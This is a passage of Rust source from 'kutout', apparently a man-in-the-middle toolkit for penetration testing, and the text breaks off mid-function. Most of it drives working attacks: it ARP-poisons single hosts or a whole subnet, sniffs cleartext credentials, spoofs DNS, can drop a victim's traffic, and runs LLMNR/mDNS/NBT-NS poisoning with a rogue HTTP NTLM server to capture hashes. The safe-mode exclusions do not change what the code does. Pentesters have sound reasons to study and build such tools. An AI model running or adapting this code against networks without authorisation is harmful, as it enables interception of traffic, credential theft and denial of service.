// kutout

mod attacks;
mod capture;
mod config;
mod events;
mod net;
mod safe_mode;
mod summary;
mod tui;

use anyhow::{anyhow, Result};
use clap::{Parser, Subcommand};
use crossterm::event::{self, Event, KeyCode, KeyModifiers};
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use crossterm::ExecutableCommand;
use ratatui::backend::CrosstermBackend;
use ratatui::Terminal;
use std::io::stdout;
use std::net::Ipv4Addr;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc, Mutex};
use std::time::{Duration, Instant};

use crate::capture::pcap::PcapWriter;
use crate::config::ResolvedConfig;
use crate::events::{
    ChannelSink, EventKind, EventSink, FanoutSink, JsonlFileSink, PentestEvent, StdoutSink,
};
use crate::net::arp;
use crate::net::firewall;
use crate::net::forwarding::{
    ForwardConfig, ForwardEvent, SharedDnsRules, SharedNtlmFlows, SharedTargets,
};
use crate::net::iface;
use crate::safe_mode::ExclusionReason;
use crate::summary::{Summary, SummarySink};
use crate::tui::app::App;
use pnet_packet::Packet;

// terminal + firewall cleanup on drop
struct SessionGuard;

impl Drop for SessionGuard {
    fn drop(&mut self) {
        let _ = disable_raw_mode();
        let _ = stdout().execute(LeaveAlternateScreen);
        firewall::cleanup();
    }
}

#[derive(Parser)]
#[command(
    name = "kutout",
    about = "mitm toolkit for penetration testing",
    version
)]
struct Cli {
    /// config file path (default: ./kutout.toml or ~/.config/kutout/config.toml)
    #[arg(short = 'c', long, global = true)]
    config: Option<PathBuf>,
    /// log file path (default: stderr)
    #[arg(long = "log-file", global = true)]
    log_file: Option<PathBuf>,

    #[command(subcommand)]
    command: Commands,
}

// "the first principle is that you must not fool yourself
//  — and you are the easiest person to fool." — richard feynman

#[derive(Subcommand)]
enum Commands {
    /// scan subnet for live hosts
    Scan {
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
        /// cidr range
        #[arg(short, long)]
        range: Option<String>,
        /// timeout seconds
        #[arg(short, long, default_value = "3")]
        timeout: u64,
    },
    /// poison target, start mitm
    Poison {
        /// target ip or "all"
        target: String,
        /// gateway ip or ".1" shorthand
        #[arg(short, long)]
        gateway: Option<String>,
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
        /// drop traffic instead of forwarding
        #[arg(short, long)]
        kill: bool,
        /// sniff cleartext creds
        #[arg(short, long)]
        sniff: bool,
        /// pcap output
        #[arg(short, long)]
        output: Option<PathBuf>,
        /// dns spoof rules (domain=ip)
        #[arg(short, long)]
        dns: Vec<String>,
        /// engagement artifact dir (events.jsonl, summary.json, hosts.csv, credentials.csv)
        #[arg(long = "out-dir")]
        out_dir: Option<PathBuf>,
    },
    /// interactive tui
    Live {
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
        /// engagement artifact dir (events.jsonl, summary.json, hosts.csv, credentials.csv)
        #[arg(long = "out-dir")]
        out_dir: Option<PathBuf>,
    },
    /// run llmnr/mdns/nbt-ns responder + rogue http ntlm auth server (no arp poisoning)
    Responder {
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
        /// engagement artifact dir
        #[arg(long = "out-dir")]
        out_dir: Option<PathBuf>,
        /// disable llmnr listener (udp/5355 multicast 224.0.0.252)
        #[arg(long)]
        no_llmnr: bool,
        /// disable mdns listener (udp/5353 multicast 224.0.0.251)
        #[arg(long)]
        no_mdns: bool,
        /// disable nbt-ns listener (udp/137 broadcast)
        #[arg(long)]
        no_nbt_ns: bool,
        /// disable rogue http ntlm auth server (tcp/80)
        #[arg(long)]
        no_http: bool,
    },
    /// list interfaces
    Ifaces,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    // config: --config > ./kutout.toml > ~/.config/kutout/config.toml > defaults
    let raw_cfg = config::load(cli.config.as_deref())?;
    let cfg = raw_cfg.resolve()?;

    // logger: --log-file wins, else cfg.log_file, else stderr
    init_logger(cli.log_file.as_deref().or(cfg.log_file.as_deref()), cfg.log_level.as_deref())?;

    match cli.command {
        Commands::Scan {
            iface,
            range,
            timeout,
        } => cmd_scan(iface.or_else(|| cfg.interface.clone()), range, timeout),
        Commands::Poison {
            target,
            gateway,
            iface,
            kill,
            sniff,
            output,
            dns,
            out_dir,
        } => cmd_poison(
            target,
            gateway,
            iface.or_else(|| cfg.interface.clone()),
            kill,
            sniff,
            output,
            dns,
            out_dir.or_else(|| cfg.out_dir.clone()),
            &cfg,
        ),
        Commands::Live { iface, out_dir } => cmd_live(
            iface.or_else(|| cfg.interface.clone()),
            out_dir.or_else(|| cfg.out_dir.clone()),
            &cfg,
        ),
        Commands::Responder {
            iface,
            out_dir,
            no_llmnr,
            no_mdns,
            no_nbt_ns,
            no_http,
        } => cmd_responder(
            iface.or_else(|| cfg.interface.clone()),
            out_dir.or_else(|| cfg.out_dir.clone()),
            !no_llmnr,
            !no_mdns,
            !no_nbt_ns,
            !no_http,
            &cfg,
        ),
        Commands::Ifaces => cmd_ifaces(),
    }
}

// route env_logger to a file if log_file is set; otherwise default to stderr.
// log_level overrides RUST_LOG when set.
fn init_logger(log_file: Option<&std::path::Path>, log_level: Option<&str>) -> Result<()> {
    let mut b = env_logger::Builder::from_default_env();
    if let Some(lvl) = log_level {
        if let Ok(parsed) = lvl.parse::<log::LevelFilter>() {
            b.filter_level(parsed);
        }
    }
    if let Some(path) = log_file {
        let file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(path)
            .map_err(|e| anyhow!("open log file {}: {}", path.display(), e))?;
        b.target(env_logger::Target::Pipe(Box::new(file)));
    }
    b.init();
    Ok(())
}

// resolve interface
fn resolve_iface(name: Option<String>) -> Result<String> {
    match name {
        Some(n) => Ok(n),
        None => iface::auto_detect_iface(),
    }
}

// run name-poisoning listeners + rogue http auth. no arp touching.
#[allow(clippy::too_many_arguments)]
fn cmd_responder(
    iface_name: Option<String>,
    out_dir: Option<PathBuf>,
    llmnr: bool,
    mdns: bool,
    nbt_ns: bool,
    http: bool,
    cfg: &ResolvedConfig,
) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    if let Some(dir) = &out_dir {
        std::fs::create_dir_all(dir).map_err(|e| anyhow!("mkdir {}: {}", dir.display(), e))?;
    }

    let summary_state = Arc::new(Mutex::new(Summary::new()));
    let mut sink = FanoutSink::new();
    sink.add(Box::new(StdoutSink));
    sink.add(Box::new(SummarySink::new(summary_state.clone())));
    if let Some(dir) = &out_dir {
        sink.add(Box::new(JsonlFileSink::create(&dir.join("events.jsonl"))?));
    }

    let _ = sink.emit(&PentestEvent::new(EventKind::SessionStarted {
        iface: name.clone(),
        our_ip: info.ip,
        gateway_ip: info.gateway_ip,
    }));

    let stop = Arc::new(AtomicBool::new(false));
    let stop_c = stop.clone();
    ctrlc_handler(stop_c);

    // one channel for all listener threads to emit through
    let (lt_tx, lt_rx) = mpsc::channel::<PentestEvent>();

    let np_cfg = attacks::name_poison::NamePoisonConfig {
        our_ip: info.ip,
        iface_ip: info.ip,
        match_list: cfg.responder_match.clone(),
        exclude_list: cfg.responder_exclude.clone(),
    };

    let mut handles = Vec::new();

    if llmnr {
        let cfg_c = np_cfg.clone();
        let tx = lt_tx.clone();
        let stop_c = stop.clone();
        handles.push(std::thread::spawn(move || {
            if let Err(e) = attacks::name_poison::run_llmnr_listener(cfg_c, tx.clone(), stop_c) {
                let _ = tx.send(PentestEvent::error(format!("llmnr listener: {}", e)));
            }
        }));
        let _ = sink.emit(&PentestEvent::info("llmnr listener up (udp/5355)"));
    }
    if mdns {
        let cfg_c = np_cfg.clone();
        let tx = lt_tx.clone();
        let stop_c = stop.clone();
        handles.push(std::thread::spawn(move || {
            if let Err(e) = attacks::name_poison::run_mdns_listener(cfg_c, tx.clone(), stop_c) {
                let _ = tx.send(PentestEvent::error(format!("mdns listener: {}", e)));
            }
        }));
        let _ = sink.emit(&PentestEvent::info("mdns listener up (udp/5353)"));
    }
    if nbt_ns {
        let cfg_c = np_cfg.clone();
        let tx = lt_tx.clone();
        let stop_c = stop.clone();
        handles.push(std::thread::spawn(move || {
            if let Err(e) = attacks::name_poison::run_nbt_ns_listener(cfg_c, tx.clone(), stop_c) {
                let _ = tx.send(PentestEvent::error(format!("nbt-ns listener: {}", e)));
            }
        }));
        let _ = sink.emit(&PentestEvent::info("nbt-ns listener up (udp/137)"));
    }
    if http {
        let tx = lt_tx.clone();
        let stop_c = stop.clone();
        let bind_ip = info.ip;
        handles.push(std::thread::spawn(move || {
            if let Err(e) = attacks::rogue_http::run_rogue_http(
                bind_ip,
                attacks::rogue_http::ROGUE_HTTP_PORT,
                tx.clone(),
                stop_c,
            ) {
                let _ = tx.send(PentestEvent::error(format!("rogue http: {}", e)));
            }
        }));
        let _ = sink.emit(&PentestEvent::info("rogue http auth server up (tcp/80)"));
    }

    // drop our own sender so channel closes when all listeners exit
    drop(lt_tx);

    let _ = sink.emit(&PentestEvent::info("ctrl-c to stop"));

    // event loop: fan events from listeners through the sink
    while !stop.load(Ordering::Relaxed) {
        match lt_rx.recv_timeout(Duration::from_millis(200)) {
            Ok(pe) => {
                let _ = sink.emit(&pe);
            }
            Err(mpsc::RecvTimeoutError::Timeout) => continue,
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }

    // drain anything the listeners emitted while we were spinning down
    while let Ok(pe) = lt_rx.try_recv() {
        let _ = sink.emit(&pe);
    }

    for h in handles {
        let _ = h.join();
    }

    let _ = sink.emit(&PentestEvent::new(EventKind::SessionEnded));

    if let Some(dir) = &out_dir {
        let s = summary_state.lock().unwrap();
        match s.write_to_dir(dir) {
            Ok(()) => println!("engagement artifacts written to {}", dir.display()),
            Err(e) => eprintln!(
                "warning: could not write summary to {}: {}",
                dir.display(),
                e
            ),
        }
    }

    Ok(())
}

// list interfaces
fn cmd_ifaces() -> Result<()> {
    let interfaces = iface::list_interfaces();
    if interfaces.is_empty() {
        println!("no usable interfaces found");
        return Ok(());
    }

    println!("{:<12} {:<18} {:<16}", "interface", "mac", "ipv4");
    println!("{}", "-".repeat(48));
    for iface in interfaces {
        let mac = iface
            .mac
            .map(|m| iface::format_mac(&m.octets()))
            .unwrap_or_else(|| "??".into());
        let ip = iface
            .ips
            .iter()
            .find(|ip| ip.is_ipv4())
            .map(|ip| ip.ip().to_string())
            .unwrap_or_else(|| "??".into());
        println!("{:<12} {:<18} {:<16}", iface.name, mac, ip);
    }
    Ok(())
}

// arp scan
fn cmd_scan(iface_name: Option<String>, range: Option<String>, timeout: u64) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    let targets = match range {
        Some(cidr) => iface::parse_cidr(&cidr)?,
        None => iface::subnet_hosts(info.ip, info.netmask),
    };

    println!(
        "scanning {} ({}) ... {} targets",
        name,
        info.ip,
        targets.len()
    );

    let stop = Arc::new(AtomicBool::new(false));
    let stop_clone = stop.clone();
    ctrlc_handler(stop_clone);

    let hosts = arp::scan(&info, &targets, Duration::from_secs(timeout), stop)?;

    println!("\n{:<16} {:<18} info", "ip", "mac");
    println!("{}", "-".repeat(50));
    for host in &hosts {
        let label = if host.ip == info.gateway_ip {
            "(gateway)"
        } else {
            ""
        };
        println!(
            "{:<16} {:<18} {}",
            host.ip,
            iface::format_mac(&host.mac),
            label
        );
    }
    println!("\n{} hosts discovered", hosts.len());

    Ok(())
}

// poison and mitm
#[allow(clippy::too_many_arguments)]
fn cmd_poison(
    target: String,
    gateway: Option<String>,
    iface_name: Option<String>,
    kill: bool,
    sniff: bool,
    output: Option<PathBuf>,
    dns_rules: Vec<String>,
    out_dir: Option<PathBuf>,
    cfg: &ResolvedConfig,
) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    let gateway_ip = match gateway {
        Some(g) => iface::expand_gateway_shorthand(&g, info.ip)?,
        None => info.gateway_ip,
    };

    let gateway_mac = resolve_mac(&info, gateway_ip)?;

    let mut targets = if target.to_lowercase() == "all" {
        let hosts = quick_scan(&info)?;
        hosts
            .into_iter()
            .filter(|h| h.ip != gateway_ip && h.ip != info.ip)
            .map(|h| (h.ip, h.mac))
            .collect::<Vec<_>>()
    } else {
        let target_ip: Ipv4Addr = target.parse().map_err(|_| anyhow!("bad target ip"))?;
        let target_mac = resolve_mac(&info, target_ip)?;
        vec![(target_ip, target_mac)]
    };

    if targets.is_empty() {
        return Err(anyhow!("no targets found"));
    }

    // safe-mode exclusions: drop targets that match cidr/mac/printer
    let excluded_targets: Vec<(Ipv4Addr, ExclusionReason)> = targets
        .iter()
        .map(|(ip, mac)| (*ip, cfg.exclusions.is_excluded_with_probe(*ip, *mac)))
        .filter(|(_, r)| r.is_excluded())
        .collect();
    targets.retain(|(ip, _)| !excluded_targets.iter().any(|(eip, _)| eip == ip));
    if targets.is_empty() {
        return Err(anyhow!(
            "all targets excluded by safe-mode; refused to poison"
        ));
    }

    // merge dns rules: config first, then cli (--dns appends)
    let mut dns_spoofs: Vec<(String, Ipv4Addr)> = cfg.dns_spoofs.clone();
    dns_spoofs.extend(dns_rules.iter().filter_map(|rule| {
        let parts: Vec<&str> = rule.splitn(2, '=').collect();
        if parts.len() == 2 {
            let ip: Ipv4Addr = parts[1].parse().ok()?;
            Some((parts[0].to_string(), ip))
        } else {
            None
        }
    }));

    // sink: stdout always, jsonl if out-dir set, summary always (for final report)
    if let Some(dir) = &out_dir {
        std::fs::create_dir_all(dir)
            .map_err(|e| anyhow!("mkdir {}: {}", dir.display(), e))?;
    }
    let summary_state = Arc::new(Mutex::new(Summary::new()));
    let mut sink = FanoutSink::new();
    sink.add(Box::new(StdoutSink));
    sink.add(Box::new(SummarySink::new(summary_state.clone())));
    if let Some(dir) = &out_dir {
        let events_path = dir.join("events.jsonl");
        sink.add(Box::new(JsonlFileSink::create(&events_path)?));
    }

    let _ = sink.emit(&PentestEvent::new(EventKind::SessionStarted {
        iface: name.clone(),
        our_ip: info.ip,
        gateway_ip,
    }));
    for (ip, reason) in &excluded_targets {
        let _ = sink.emit(&PentestEvent::info(format!(
            "excluded {} ({})",
            ip,
            reason.label()
        )));
    }
    let _ = sink.emit(&PentestEvent::info(format!(
        "poisoning {} target(s)",
        targets.len()
    )));
    if kill {
        let _ = sink.emit(&PentestEvent::info("mode: kill (dropping all traffic)"));
    }
    if sniff {
        let _ = sink.emit(&PentestEvent::info("credential sniffing: enabled"));
    }
    if !dns_spoofs.is_empty() {
        for (domain, ip) in &dns_spoofs {
            let _ = sink.emit(&PentestEvent::new(EventKind::DnsRuleAdded {
                domain: domain.clone(),
                ip: *ip,
            }));
        }
    }
    for (tip, tmac) in &targets {
        let _ = sink.emit(&PentestEvent::new(EventKind::ArpPoisonStarted {
            target_ip: *tip,
            target_mac: *tmac,
            gateway_ip,
        }));
    }

    // ip forwarding (restored on drop)
    let _ip_fwd_guard = if !kill {
        match iface::IpForwardGuard::enable() {
            Ok(guard) => {
                let _ = sink.emit(&PentestEvent::info("ip forwarding: enabled"));
                Some(guard)
            }
            Err(e) => {
                let _ = sink.emit(&PentestEvent::error(format!(
                    "could not enable ip forwarding: {} (run: sysctl -w net.ipv4.ip_forward=1)",
                    e
                )));
                None
            }
        }
    } else {
        if let Ok(true) = iface::ip_forward_enabled() {
            let _ = sink.emit(&PentestEvent::error(
                "ip_forward is on, kill mode may leak traffic",
            ));
        }
        None
    };

    let stop = Arc::new(AtomicBool::new(false));
    let stop_clone = stop.clone();
    ctrlc_handler(stop_clone);

    // poison threads
    let mut poison_handles = Vec::new();
    for (target_ip, target_mac) in &targets {
        let info_clone = info.clone();
        let tip = *target_ip;
        let tmac = *target_mac;
        let gip = gateway_ip;
        let gmac = gateway_mac;
        let stop_c = stop.clone();

        let handle = std::thread::spawn(move || {
            arp::poison_loop(&info_clone, tip, tmac, gip, gmac, Duration::from_secs(2), stop_c)
        });
        poison_handles.push(handle);
    }

    // forwarding
    let (event_tx, event_rx) = mpsc::channel();
    let ntlm_flows: SharedNtlmFlows = Arc::new(Mutex::new(Default::default()));
    let forward_config = ForwardConfig {
        targets: Arc::new(Mutex::new(targets.clone())),
        gateway_mac,
        kill_mode: kill,
        dns_spoofs: Arc::new(Mutex::new(dns_spoofs)),
        sniff_creds: sniff,
        capture: output.is_some(),
        ntlm_flows,
    };

    let info_fwd = info.clone();
    let stop_fwd = stop.clone();
    let fwd_handle = std::thread::spawn(move || {
        net::forwarding::forwarding_loop(&info_fwd, forward_config, event_tx, stop_fwd)
    });

    // pcap
    let mut pcap_writer = match &output {
        Some(path) => Some(PcapWriter::create(path)?),
        None => None,
    };

    // event loop: raw frames → pcap, everything else → sink
    while !stop.load(Ordering::Relaxed) {
        match event_rx.recv_timeout(Duration::from_millis(200)) {
            Ok(ForwardEvent::RawFrame { data, timestamp_us }) => {
                if let Some(ref mut w) = pcap_writer {
                    let _ = w.write_packet(&data, timestamp_us);
                }
            }
            Ok(other) => {
                if let Some(pe) = PentestEvent::from_forward(other) {
                    let _ = sink.emit(&pe);
                }
            }
            Err(mpsc::RecvTimeoutError::Timeout) => continue,
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }

    // cleanup
    let _ = sink.emit(&PentestEvent::info("restoring arp tables..."));
    for handle in poison_handles {
        let _ = handle.join();
    }
    drop(fwd_handle);
    let _ = sink.emit(&PentestEvent::new(EventKind::ArpCured));

    if let Some(w) = pcap_writer {
        let count = w.finish()?;
        let _ = sink.emit(&PentestEvent::info(format!(
            "wrote {} packets to pcap",
            count
        )));
    }

    let _ = sink.emit(&PentestEvent::new(EventKind::SessionEnded));

    // dump summary artifacts before returning
    if let Some(dir) = &out_dir {
        let s = summary_state.lock().unwrap();
        if let Err(e) = s.write_to_dir(dir) {
            eprintln!("warning: could not write summary to {}: {}", dir.display(), e);
        } else {
            println!("engagement artifacts written to {}", dir.display());
        }
    }

    Ok(())
}

// interactive tui
fn cmd_live(
    iface_name: Option<String>,
    out_dir: Option<PathBuf>,
    cfg: &ResolvedConfig,
) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    let mut app = App::new(
        name.clone(),
        info.ip,
        info.gateway_ip,
        cfg.exclusions.clone(),
    );

    // sink: channel feeds tui, summary always, jsonl if out-dir set
    if let Some(dir) = &out_dir {
        std::fs::create_dir_all(dir)
            .map_err(|e| anyhow!("mkdir {}: {}", dir.display(), e))?;
    }
    let summary_state = Arc::new(Mutex::new(Summary::new()));
    let (pentest_tx, pentest_rx) = mpsc::channel::<PentestEvent>();
    let mut sink = FanoutSink::new();
    sink.add(Box::new(ChannelSink::new(pentest_tx)));
    sink.add(Box::new(SummarySink::new(summary_state.clone())));
    if let Some(dir) = &out_dir {
        let events_path = dir.join("events.jsonl");
        sink.add(Box::new(JsonlFileSink::create(&events_path)?));
    }

    let _ = sink.emit(&PentestEvent::new(EventKind::SessionStarted {
        iface: name.clone(),
        our_ip: info.ip,
        gateway_ip: info.gateway_ip,
    }));

    // ip forwarding
    let _ip_fwd_guard = match iface::IpForwardGuard::enable() {
        Ok(guard) => {
            let _ = sink.emit(&PentestEvent::info("ip forwarding enabled"));
            Some(guard)
        }
        Err(e) => {
            let _ = sink.emit(&PentestEvent::error(format!("ip_forward failed: {}", e)));
            None
        }
    };

    // firewall chain
    match firewall::init() {
        Ok(()) => {
            let _ = sink.emit(&PentestEvent::info("firewall chain ready"));
        }
        Err(e) => {
            let _ = sink.emit(&PentestEvent::error(format!(
                "iptables init failed (kill mode unavailable): {}",
                e
            )));
        }
    }

    // terminal setup
    enable_raw_mode()?;
    stdout().execute(EnterAlternateScreen)?;
    let _session = SessionGuard;
    let backend = CrosstermBackend::new(stdout());
    let mut terminal = Terminal::new(backend)?;

    let stop = Arc::new(AtomicBool::new(false));

    // shared state
    let shared_targets: SharedTargets = Arc::new(Mutex::new(Vec::new()));
    let mut poison_stops: Vec<Arc<AtomicBool>> = Vec::new();
    let mut forwarding_spawned = false;

    // channels
    let (event_tx, event_rx) = mpsc::channel::<ForwardEvent>();
    let (scan_tx, scan_rx) = mpsc::channel::<Result<Vec<arp::Host>>>();
    let mut scanning = false;

    // dns rules
    let shared_dns_rules: SharedDnsRules = Arc::new(Mutex::new(Vec::new()));

    // ntlm pairing state: shared between forwarding thread and (future) rogue servers
    let shared_ntlm_flows: SharedNtlmFlows = Arc::new(Mutex::new(Default::default()));

    // responder listeners (llmnr/mdns/nbt-ns/http) — spawned on 'r' keybind
    let (responder_tx, responder_rx) = mpsc::channel::<PentestEvent>();
    let mut responder_stop: Option<Arc<AtomicBool>> = None;
    let mut responder_handles: Vec<std::thread::JoinHandle<()>> = Vec::new();

    // render loop
    let tick_rate = Duration::from_millis(100);
    let mut last_tick = Instant::now();

    loop {
        terminal.draw(|frame| tui::render::draw(frame, &app))?;

        let timeout = tick_rate
            .checked_sub(last_tick.elapsed())
            .unwrap_or(Duration::ZERO);

        if event::poll(timeout)? {
            if let Event::Key(key) = event::read()? {
              if app.input_mode != tui::app::InputMode::Normal {
                // text input
                match key.code {
                    KeyCode::Enter => {
                        let input = app.input_buffer.clone();
                        app.input_buffer.clear();
                        app.input_mode = tui::app::InputMode::Normal;
                        let parts: Vec<&str> = input.splitn(2, '=').collect();
                        if parts.len() == 2 {
                            if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                                let domain = parts[0].to_string();
                                shared_dns_rules
                                    .lock()
                                    .unwrap()
                                    .push((domain.clone(), ip));
                                app.dns_rule_count += 1;
                                let _ = sink.emit(&PentestEvent::new(
                                    EventKind::DnsRuleAdded {
                                        domain: domain.clone(),
                                        ip,
                                    },
                                ));
                                app.status_message =
                                    format!("dns rule: {} -> {}", domain, ip);
                            } else {
                                app.status_message = "bad ip in dns rule".into();
                            }
                        } else {
                            app.status_message =
                                "format: domain=ip (e.g. evil.com=10.0.0.1)".into();
                        }
                    }
                    KeyCode::Esc => {
                        app.input_mode = tui::app::InputMode::Normal;
                        app.input_buffer.clear();
                        app.status_message = "cancelled".into();
                    }
                    KeyCode::Backspace => {
                        app.input_buffer.pop();
                    }
                    KeyCode::Char(c) => {
                        app.input_buffer.push(c);
                    }
                    _ => {}
                }
              } else {
                match (key.code, key.modifiers) {
                    (KeyCode::Char('q'), _) | (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                        app.running = false;
                        stop.store(true, Ordering::Relaxed);
                        for ps in &poison_stops {
                            ps.store(true, Ordering::Relaxed);
                        }
                        if let Some(s) = responder_stop.take() {
                            s.store(true, Ordering::Relaxed);
                        }
                        break;
                    }
                    (KeyCode::Tab, _) => app.toggle_panel(),
                    (KeyCode::Char('j'), _) | (KeyCode::Down, _) => {
                        match app.active_panel {
                            tui::app::Panel::Hosts => app.scroll_hosts(1),
                            tui::app::Panel::Log => app.scroll_log(1),
                        }
                    }
                    (KeyCode::Char('k'), _) | (KeyCode::Up, _) => {
                        match app.active_panel {
                            tui::app::Panel::Hosts => app.scroll_hosts(-1),
                            tui::app::Panel::Log => app.scroll_log(-1),
                        }
                    }
                    (KeyCode::Char('s'), _) => {
                        // async arp scan
                        if scanning {
                            app.status_message = "scan already in progress".into();
                        } else {
                            scanning = true;
                            let target_count =
                                iface::subnet_hosts(info.ip, info.netmask).len();
                            let _ = sink.emit(&PentestEvent::new(
                                EventKind::ScanStarted { target_count },
                            ));
                            app.status_message = "scanning...".into();
                            let info_c = info.clone();
                            let tx = scan_tx.clone();
                            let stop_c = stop.clone();
                            std::thread::spawn(move || {
                                let targets =
                                    iface::subnet_hosts(info_c.ip, info_c.netmask);
                                let result = arp::scan(
                                    &info_c,
                                    &targets,
                                    Duration::from_secs(3),
                                    stop_c,
                                );
                                let _ = tx.send(result);
                            });
                        }
                    }
                    (KeyCode::Char('p'), _) => {
                        // poison selected — refuse if excluded by safe-mode
                        if let Some(host) = app.hosts.get(app.host_scroll) {
                            let target_ip = host.ip;
                            let target_mac = host.mac;
                            let gateway_ip = info.gateway_ip;

                            if app.is_excluded(target_ip, target_mac) {
                                let _ = sink.emit(&PentestEvent::error(format!(
                                    "refused to poison excluded host {}",
                                    target_ip
                                )));
                                app.status_message =
                                    format!("{} is excluded by safe-mode", target_ip);
                                continue;
                            }

                            match resolve_mac(&info, gateway_ip) {
                                Ok(gateway_mac) => {
                                    if app.poisons.iter().any(|p| p.target_ip == target_ip) {
                                        app.status_message = "already poisoned".into();
                                    } else {
                                        shared_targets
                                            .lock()
                                            .unwrap()
                                            .push((target_ip, target_mac));

                                        let entry = tui::app::PoisonEntry {
                                            target_ip,
                                            kill_mode: false,
                                            packets_forwarded: 0,
                                        };
                                        app.poisons.push(entry);

                                        let poison_stop = Arc::new(AtomicBool::new(false));
                                        poison_stops.push(poison_stop.clone());
                                        let info_c = info.clone();
                                        std::thread::spawn(move || {
                                            let _ = arp::poison_loop(
                                                &info_c,
                                                target_ip,
                                                target_mac,
                                                gateway_ip,
                                                gateway_mac,
                                                Duration::from_secs(2),
                                                poison_stop,
                                            );
                                        });

                                        // first poison starts forwarding
                                        if !forwarding_spawned {
                                            let fwd_config = ForwardConfig {
                                                targets: shared_targets.clone(),
                                                gateway_mac,
                                                kill_mode: false,
                                                dns_spoofs: shared_dns_rules.clone(),
                                                sniff_creds: true,
                                                capture: false,
                                                ntlm_flows: shared_ntlm_flows.clone(),
                                            };
                                            let fwd_info = info.clone();
                                            let fwd_tx = event_tx.clone();
                                            let fwd_stop = stop.clone();
                                            std::thread::spawn(move || {
                                                let _ = net::forwarding::forwarding_loop(
                                                    &fwd_info, fwd_config, fwd_tx, fwd_stop,
                                                );
                                            });
                                            forwarding_spawned = true;
                                            let _ = sink.emit(&PentestEvent::info(
                                                "forwarding engine started",
                                            ));
                                        }

                                        let _ = sink.emit(&PentestEvent::new(
                                            EventKind::ArpPoisonStarted {
                                                target_ip,
                                                target_mac,
                                                gateway_ip,
                                            },
                                        ));
                                        app.status_message =
                                            format!("poisoning {}", target_ip);
                                    }
                                }
                                Err(e) => {
                                    let _ = sink.emit(&PentestEvent::error(format!(
                                        "can't resolve gateway mac: {}",
                                        e
                                    )));
                                }
                            }
                        }
                    }
                    (KeyCode::Char('x'), _) => {
                        // toggle kill
                        let host_ip = app.hosts.get(app.host_scroll).map(|h| h.ip);
                        if let Some(ip) = host_ip {
                            if let Some(poison) =
                                app.poisons.iter_mut().find(|p| p.target_ip == ip)
                            {
                                poison.kill_mode = !poison.kill_mode;
                                let result = if poison.kill_mode {
                                    firewall::kill(ip)
                                } else {
                                    firewall::unkill(ip)
                                };
                                match result {
                                    Ok(()) => {
                                        let kind = if poison.kill_mode {
                                            EventKind::KillEnabled { target_ip: ip }
                                        } else {
                                            EventKind::KillDisabled { target_ip: ip }
                                        };
                                        let _ = sink.emit(&PentestEvent::new(kind));
                                        let mode = if poison.kill_mode {
                                            "kill"
                                        } else {
                                            "forward"
                                        };
                                        app.status_message =
                                            format!("{} -> {}", ip, mode);
                                    }
                                    Err(e) => {
                                        poison.kill_mode = !poison.kill_mode;
                                        let _ = sink.emit(&PentestEvent::error(format!(
                                            "iptables failed: {}",
                                            e
                                        )));
                                        app.status_message =
                                            "kill mode failed (iptables)".into();
                                    }
                                }
                            } else {
                                app.status_message = "not poisoned yet".into();
                            }
                        }
                    }
                    (KeyCode::Char('c'), _) => {
                        // cure all — arp, dns rules, and responder listeners
                        for ps in &poison_stops {
                            ps.store(true, Ordering::Relaxed);
                        }
                        poison_stops.clear();
                        shared_targets.lock().unwrap().clear();
                        shared_dns_rules.lock().unwrap().clear();
                        app.dns_rule_count = 0;
                        firewall::cleanup();
                        let _ = firewall::init();
                        app.poisons.clear();
                        if let Some(s) = responder_stop.take() {
                            s.store(true, Ordering::Relaxed);
                            app.responder_active = false;
                        }
                        let _ = sink.emit(&PentestEvent::new(EventKind::DnsRulesCleared));
                        let _ = sink.emit(&PentestEvent::new(EventKind::ArpCured));
                        app.status_message = "cured: arp + dns + responder".into();
                    }
                    (KeyCode::Char('d'), _) => {
                        // dns input mode
                        app.input_mode = tui::app::InputMode::DnsInput;
                        app.input_buffer.clear();
                        app.status_message = String::new();
                    }
                    (KeyCode::Char('r'), _) => {
                        // toggle responder listeners (llmnr/mdns/nbt-ns/http)
                        if responder_stop.is_none() {
                            let rstop = Arc::new(AtomicBool::new(false));
                            let np_cfg = attacks::name_poison::NamePoisonConfig {
                                our_ip: info.ip,
                                iface_ip: info.ip,
                                match_list: cfg.responder_match.clone(),
                                exclude_list: cfg.responder_exclude.clone(),
                            };
                            // llmnr
                            {
                                let c = np_cfg.clone();
                                let t = responder_tx.clone();
                                let s = rstop.clone();
                                responder_handles.push(std::thread::spawn(move || {
                                    if let Err(e) =
                                        attacks::name_poison::run_llmnr_listener(c, t.clone(), s)
                                    {
                                        let _ = t.send(PentestEvent::error(format!(
                                            "llmnr: {}",
                                            e
                                        )));
                                    }
                                }));
                            }
                            // mdns
                            {
                                let c = np_cfg.clone();
                                let t = responder_tx.clone();
                                let s = rstop.clone();
                                responder_handles.push(std::thread::spawn(move || {
                                    if let Err(e) =
                                        attacks::name_poison::run_mdns_listener(c, t.clone(), s)
                                    {
                                        let _ = t.send(PentestEvent::error(format!(
                                            "mdns: {}",
                                            e
                                        )));
                                    }
                                }));
                            }
                            // nbt-ns
                            {
                                let c = np_cfg.clone();
                                let t = responder_tx.clone();
                                let s = rstop.clone();
                                responder_handles.push(std::thread::spawn(move || {
                                    if let Err(e) =
                                        attacks::name_poison::run_nbt_ns_listener(c, t.clone(), s)
                                    {
                                        let _ = t.send(PentestEvent::error(format!(
                                            "nbt-ns: {}",
                                            e
                                        )));
                                    }
                                }));
                            }
                            // rogue http
                            {
                                let t = responder_tx.clone();
                                let s = rstop.clone();
                                let bind = info.ip;
